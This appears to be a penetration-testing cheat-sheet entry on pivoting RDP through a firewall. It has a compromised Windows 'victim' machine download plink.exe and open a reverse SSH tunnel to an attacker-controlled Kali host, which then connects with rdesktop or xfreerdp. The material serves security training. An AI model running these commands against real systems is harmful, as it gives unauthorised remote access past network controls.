# Plink for Remote Desktop Connections

Used in case RDP service (usually 3389/tcp) is not accessible directly (i.e. not allowed through the external firewall)

1. On local machine (~Kali)
    1. Create a limited user[^1]
        
1. On target machine (Windows)
    1. Check first if somebody has currently connected to the host's RDP service
        * `#!bash qwinsta /server:<server_name>`
    1. Download *plink.exe* on the target machine
    1. Execute a reverse SSH connection using Plink.exe
        * `#!bash echo y | plink.exe <YOUR_IP> -P 22 -R 3389:127.0.0.1:3389 -l <created_limited_username> -pw <password>`
1. On the local machine (~Kali)
    1. Connect to the RDP service using an RDP Client
        * `#!bash rdesktop -g90x90 localhost` (Usually fails)
        * `#!bash xfreerdp /u:"<victim_machine_username>" /v:localhost:3389`



[^1]: [Instructions on creating a limited user](https://ostechnix.com/how-to-limit-users-access-to-the-linux-system/)